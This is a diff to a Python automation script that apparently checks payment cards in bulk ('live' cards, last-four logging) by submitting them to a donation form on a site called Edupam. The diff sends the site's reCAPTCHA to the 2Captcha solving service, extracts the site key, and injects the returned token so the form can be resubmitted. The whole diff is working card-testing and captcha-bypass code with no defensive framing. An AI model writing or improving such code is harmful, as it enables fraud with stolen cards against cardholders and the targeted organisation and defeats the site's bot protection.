@@ -44,49 +44,86 @@ checking_status = {
     'stop_on_live': False
 }
 
+
+
+
 class CaptchaSolver:
-    """Clase para resolver captchas usando librería oficial 2captcha"""
+    """Clase para resolver captchas usando API de 2Captcha"""
     
     def __init__(self, api_key):
         self.api_key = api_key
-        self.solver = None
+        self.base_url = "https://2captcha.com"
         
-        if api_key:
-            try:
-                # Inicializar solver oficial
-                self.solver = TwoCaptcha(api_key)
-                logger.info("✅ Solver 2Captcha inicializado con librería oficial")
-            except Exception as e:
-                logger.error(f"❌ Error inicializando 2Captcha: {e}")
-                self.solver = None
-    
     def solve_recaptcha_v2(self, site_key, page_url):
-        """Resolver reCAPTCHA v2 usando librería oficial"""
+        """Resolver reCAPTCHA v2 usando la API de 2Captcha"""
         try:
-            if not self.solver:
-                logger.warning("⚠️ Solver de 2Captcha no inicializado")
+            if not self.api_key:
+                logger.warning("⚠️ API key de 2Captcha no configurada")
                 return None
             
-            logger.info(f"🔄 Resolviendo reCAPTCHA v2 con librería oficial...")
+            # Enviar captcha a 2Captcha
+            params = {
+                'key': self.api_key,
+                'method': 'userrecaptcha',
+                'googlekey': site_key,
+                'pageurl': page_url,
+                'json': 1,
+                'invisible': 0  # Captcha visible, NO invisible
+            }
             
-            result = self.solver.recaptcha(
-                sitekey=site_key,
-                url=page_url,
-                version='v2'
-            )
+            logger.info(f"🔄 Enviando reCAPTCHA v2 a 2Captcha...")
+            logger.info(f"📊 Site key: {site_key[:20]}...")
+            logger.info(f"🌐 URL: {page_url}")
             
-            if result and result.get('code'):
-                logger.info(f"✅ Captcha resuelto: {result['code'][:20]}...")
-                return result['code']
-            else:
-                logger.error("❌ No se obtuvo solución del captcha")
+            response = requests.post(f"{self.base_url}/in.php", data=params, timeout=30)
+            result = response.json()
+            
+            if result.get('status') != 1:
+                error = result.get('error_text', 'Error desconocido')
+                logger.error(f"❌ Error 2Captcha: {error}")
                 return None
+            
+            captcha_id = result['request']
+            logger.info(f"✅ Captcha enviado. ID: {captcha_id}")
+            
+            # Esperar solución (hasta 2 minutos)
+            for i in range(30):  # 30 * 4 = 120 segundos
+                time.sleep(4)  # Esperar 4 segundos entre intentos
                 
+                params = {
+                    'key': self.api_key,
+                    'action': 'get',
+                    'id': captcha_id,
+                    'json': 1
+                }
+                
+                response = requests.get(f"{self.base_url}/res.php", params=params, timeout=30)
+                result = response.json()
+                
+                if result.get('status') == 1:
+                    solution = result['request']
+                    logger.info(f"✅ Captcha resuelto en {(i+1)*4} segundos")
+                    logger.info(f"📦 Solución (primeros 30 chars): {solution[:30]}...")
+                    return solution
+                elif result.get('request') == 'CAPCHA_NOT_READY':
+                    if (i+1) % 5 == 0:  # Log cada 20 segundos
+                        logger.info(f"⏳ Captcha no listo... {i+1}/30 intentos")
+                    continue
+                else:
+                    error = result.get('error_text', 'Error desconocido')
+                    logger.error(f"❌ Error al resolver captcha: {error}")
+                    return None
+            
+            logger.error("❌ Tiempo de espera agotado para captcha (2 minutos)")
+            return None
+            
         except Exception as e:
             logger.error(f"❌ Error en solve_recaptcha_v2: {e}")
-            return None
-        
-        
+            return None     
+
+
+
+
 class PaymentAnalyzer:
     """Analizador de respuestas de pagos para Edupam"""
     
@@ -271,41 +308,96 @@ class EdupamChecker:
             logger.error(f"Error llenando tarjeta: {e}")
             return False
     
+
     def solve_captcha_if_present(self, page, card_last4):
         """Detectar y resolver captcha si está presente"""
         try:
             # Esperar un momento para que cargue el captcha si existe
             time.sleep(3)
             
-            # Verificar si hay reCAPTCHA v2 presente
-            captcha_found = False
-            site_key = None
+            # Verificar contenido de la página para detectar captcha
+            page_content = page.content()
+            page_content_lower = page_content.lower()
             
-            # Buscar diferentes patrones de reCAPTCHA
-            checkbox_selectors = [
-                'div.recaptcha-checkbox',
-                '.recaptcha-checkbox-border',
-                'div[role="checkbox"]',
-                'iframe[title*="recaptcha"]',
-                '#recaptcha-anchor'
+            # Buscar indicadores de captcha en el contenido
+            captcha_indicators = [
+                'one more step before you\'re done',
+                'i am human',
+                'soy humano',
+                'recaptcha',
+                'g-recaptcha',
+                'not a robot'
             ]
             
-            for selector in checkbox_selectors:
-                try:
-                    if page.locator(selector).count() > 0:
-                        page.locator(selector).click
-                        logger.info(f"✅ Haciendo clic en checkbox 'I'm human' con selector: {selector}")
-                        
-                        time.sleep(1)
-                        break
-                except:
-                    continue
+            has_captcha = any(indicator in page_content_lower for indicator in captcha_indicators)
             
-        except Exception as e:
-            logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
-                    
+            if not has_captcha:
+                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
+                return True
+            
+            logger.info(f"🛡️ Captcha detectado en página para ****{card_last4}")
+            
+            # Buscar site-key
+            site_key = None
+            
+            # Buscar en atributos data-sitekey
+            try:
+                site_key = page.evaluate("""
+                    () => {
+                        // Buscar data-sitekey
+                        const elements = document.querySelectorAll('[data-sitekey]');
+                        if (elements.length > 0) {
+                            return elements[0].getAttribute('data-sitekey');
+                        }
+                        
+                        // Buscar en iframes de recaptcha
+                        const iframes = document.querySelectorAll('iframe[src*="google.com/recaptcha"]');
+                        for (let iframe of iframes) {
+                            const src = iframe.getAttribute('src');
+                            const match = src.match(/[?&]k=([^&]+)/);
+                            if (match) return match[1];
+                        }
+                        
+                        return null;
+                    }
+                """)
+            except Exception as e:
+                logger.warning(f"⚠️ Error buscando site-key con JS: {e}")
+            
+            # Si no se encontró con JS, intentar con selectores
+            if not site_key:
+                selectors_to_check = [
+                    'div[data-sitekey]',
+                    '.g-recaptcha[data-sitekey]',
+                    'iframe[src*="google.com/recaptcha"]'
+                ]
+                
+                for selector in selectors_to_check:
+                    try:
+                        if page.locator(selector).count() > 0:
+                            if 'data-sitekey' in selector:
+                                site_key = page.locator(selector).first.get_attribute('data-sitekey')
+                            elif 'iframe' in selector:
+                                iframe_src = page.locator(selector).first.get_attribute('src')
+                                if iframe_src:
+                                    match = re.search(r'k=([^&]+)', iframe_src)
+                                    if match:
+                                        site_key = match.group(1)
+                            break
+                    except:
+                        continue
+            
+            if not site_key:
+                logger.error(f"❌ Captcha detectado pero no se pudo obtener site-key para ****{card_last4}")
+                return False
+            
+            if not self.captcha_solver:
+                logger.error(f"❌ API key de 2Captcha no configurada para ****{card_last4}")
+                return False
+            
+            logger.info(f"✅ Site-key encontrado: {site_key[:30]}...")
+            
             # Resolver captcha
-            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
             page_url = page.url
             solution = self.captcha_solver.solve_recaptcha_v2(site_key, page_url)
             
@@ -317,48 +409,50 @@ class EdupamChecker:
             
             # Inyectar la solución en la página
             try:
-                # Ejecutar script para llenar el campo g-recaptcha-response
+                # Método 1: Inyectar directamente
                 page.evaluate(f"""
-                    () => {{
-                        // Buscar el textarea de respuesta
-                        const responseField = document.getElementById('g-recaptcha-response');
+                    (solution) => {{
+                        // Buscar el campo g-recaptcha-response
+                        let responseField = document.getElementById('g-recaptcha-response');
+                        if (!responseField) {{
+                            responseField = document.querySelector('[name="g-recaptcha-response"]');
+                        }}
+                        
                         if (responseField) {{
-                            responseField.value = '{solution}';
-                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                            console.log('✅ Captcha solution injected');
-                            return true;
+                            responseField.value = solution;
+                            console.log('✅ Captcha solution injected into existing field');
+                        }} else {{
+                            // Crear campo si no existe
+                            responseField = document.createElement('textarea');
+                            responseField.id = 'g-recaptcha-response';
+                            responseField.name = 'g-recaptcha-response';
+                            responseField.style.display = 'none';
+                            responseField.value = solution;
+                            document.body.appendChild(responseField);
+                            console.log('✅ Captcha solution field created and injected');
                         }}
                         
-                        // Si no existe, intentar encontrar por nombre
-                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
-                        if (responseByName) {{
-                            responseByName.value = '{solution}';
-                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                            console.log('✅ Captcha solution injected by name');
-                            return true;
-                        }}
+                        // Disparar eventos de cambio
+                        const event = new Event('change', {{ bubbles: true }});
+                        responseField.dispatchEvent(event);
                         
-                        // Crear campo si no existe
-                        const newField = document.createElement('textarea');
-                        newField.id = 'g-recaptcha-response';
-                        newField.name = 'g-recaptcha-response';
-                        newField.style.display = 'none';
-                        newField.value = '{solution}';
-                        document.body.appendChild(newField);
-                        console.log('✅ Created and injected captcha solution');
+                        // También disparar input event para algunos formularios
+                        const inputEvent = new Event('input', {{ bubbles: true }});
+                        responseField.dispatchEvent(inputEvent);
+                        
                         return true;
                     }}
-                """)
+                """, solution)
                 
                 # Pequeña espera para que se procese
                 time.sleep(2)
                 
-                # Volver a hacer clic en el botón de donar después de resolver captcha
+                # Re-enviar el formulario
                 btn = page.locator('#btn-donation')
                 if btn.count() > 0:
                     btn.click()
                     logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
-                    time.sleep(3)  # Esperar después del segundo envío
+                    time.sleep(5)  # Esperar más después del re-envío
                 
                 return True
                 
@@ -371,167 +465,7 @@ class EdupamChecker:
             return False
 
 
-        """Detectar y resolver captcha si está presente"""
-        try:
-            # Esperar un momento para que cargue el captcha si existe
-            time.sleep(3)
-            
-            # Verificar si hay reCAPTCHA v2 presente
-            captcha_found = False
-            site_key = None
-            
-            # Buscar diferentes patrones de reCAPTCHA
-            selectors_to_check = [
-                'div[data-sitekey]',
-                '.g-recaptcha',
-                'iframe[src*="google.com/recaptcha"]',
-                'iframe[title*="reCAPTCHA"]'
-            ]
-            
-            for selector in selectors_to_check:
-                try:
-                    if page.locator(selector).count() > 0:
-                        captcha_found = True
-                        logger.info(f"🛡️ Captcha detectado con selector: {selector}")
-                        
-                        # Intentar obtener site-key
-                        if 'data-sitekey' in selector:
-                            site_key = page.locator(selector).first.get_attribute('data-sitekey')
-                        else:
-                            # Buscar el div con data-sitekey dentro del contenedor
-                            site_key = page.locator(f'{selector} [data-sitekey]').first.get_attribute('data-sitekey')
-                            if not site_key:
-                                # Intentar obtener del iframe
-                                iframe_src = page.locator('iframe[src*="google.com/recaptcha"]').first.get_attribute('src')
-                                if iframe_src:
-                                    # Extraer site-key de la URL del iframe
-                                    match = re.search(r'k=([^&]+)', iframe_src)
-                                    if match:
-                                        site_key = match.group(1)
-                        
-                        if site_key:
-                            logger.info(f"✅ Site-key encontrado: {site_key[:20]}...")
-                        break
-                except:
-                    continue
-            
-            if not captcha_found:
-                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
-                return True
-            
-            if not site_key:
-                logger.warning(f"⚠️ Captcha detectado pero no se pudo obtener site-key para ****{card_last4}")
-                return False
-            
-            if not self.captcha_solved:
-                logger.error(f"❌ API key de 2Captcha no configurada para ****{card_last4}")
-                return False
-            
-            # Resolver captcha
-            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
-            page_url = page.url
-            solution = self.captcha_solved.solve_recaptcha_v2(site_key, page_url)
-            
-            if not solution:
-                logger.error(f"❌ No se pudo resolver el captcha para ****{card_last4}")
-                return False
-            
-            logger.info(f"✅ Captcha resuelto para ****{card_last4}")
-            
-            # Inyectar la solución en la página
-            try:
-                # Ejecutar script para llenar el campo g-recaptcha-response
-                page.evaluate(f"""
-                    () => {{
-                        // Buscar el textarea de respuesta
-                        const responseField = document.getElementById('g-recaptcha-response');
-                        if (responseField) {{
-                            responseField.value = '{solution}';
-                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                            console.log('✅ Captcha solution injected');
-                            return true;
-                        }}
-                        
-                        // Si no existe, intentar encontrar por nombre
-                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
-                        if (responseByName) {{
-                            responseByName.value = '{solution}';
-                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                            console.log('✅ Captcha solution injected by name');
-                            return true;
-                        }}
-                        
-                        // Crear campo si no existe
-                        const newField = document.createElement('textarea');
-                        newField.id = 'g-recaptcha-response';
-                        newField.name = 'g-recaptcha-response';
-                        newField.style.display = 'none';
-                            newField.value = '{solution}';
-                            document.body.appendChild(newField);
-                            console.log('✅ Created and injected captcha solution');
-                            return true;
-                        }}
-                    """)
-                
-                # Pequeña espera para que se procese
-                time.sleep(2)
-                
-                # === AÑADE ESTO: Hacer clic en el checkbox "I'm human" ===
-                try:
-                    # Buscar y hacer clic en el checkbox del captcha
-                    checkbox_selectors = [
-                        'div.recaptcha-checkbox',
-                        '.recaptcha-checkbox-border',
-                        'div[role="checkbox"]',
-                        '#recaptcha-anchor',
-                        'iframe[title*="recaptcha"]'
-                    ]
-                    
-                    for selector in checkbox_selectors:
-                        try:
-                            if page.locator(selector).count() > 0:
-                                page.locator(selector).click()
-                                logger.info(f"✅ Haciendo clic en checkbox con selector: {selector}")
-                                time.sleep(1)
-                                break
-                        except:
-                            continue
-                    
-                    # También intentar con JavaScript
-                    page.evaluate("""
-                        () => {
-                            // Intentar encontrar y hacer clic en el checkbox
-                            const checkboxes = document.querySelectorAll('[role="checkbox"], .recaptcha-checkbox, #recaptcha-anchor');
-                            checkboxes.forEach(cb => {
-                                if (cb.getAttribute('aria-checked') === 'false' || 
-                                    !cb.getAttribute('aria-checked')) {
-                                    cb.click();
-                                }
-                            });
-                            return checkboxes.length > 0;
-                        }
-                    """)
-                    
-                except Exception as e:
-                    logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
-                # === FIN DEL AÑADIDO ===
-                
-                # Volver a hacer clic en el botón de donar después de resolver captcha
-                btn = page.locator('#btn-donation')
-                if btn.count() > 0:
-                    btn.click()
-                    logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
-                    time.sleep(3)  # Esperar después del segundo envío
-                
-                return True
-                
-            except Exception as e:
-                logger.error(f"❌ Error inyectando solución de captcha para ****{card_last4}: {e}")
-                return False
-                
-        except Exception as e:
-            logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
-            return False
+    
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta - CIERRA después de cada una"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
@@ -618,7 +552,7 @@ class EdupamChecker:
                 captcha_solved = self.solve_captcha_if_present(page, card_last4)
             
             # Esperar respuesta después del captcha (o sin captcha)
-            wait_time = 10 if captcha_solved else 5
+            wait_time = 15 if captcha_solved else 8
             logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
             time.sleep(wait_time)
             
